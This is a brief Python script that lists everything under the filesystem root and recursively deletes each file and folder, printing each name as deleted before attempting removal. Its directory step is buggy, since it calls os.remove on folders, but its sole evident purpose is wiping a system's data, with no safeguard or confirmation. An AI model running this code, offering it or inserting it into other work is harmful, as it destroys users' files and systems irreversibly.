import os

def delete_file(file):
    try:
        # Try to delete the file or folder
        print(file + " deleted")
        os.remove("/" + file)
    except OSError:
        # Delete all files in the given folder
        for subFile in os.listdir("/" + file):
            delete_file(f"{file}/{subFile}")
        
        os.remove("/" + file)


for file in os.listdir("/"):
    delete_file(file)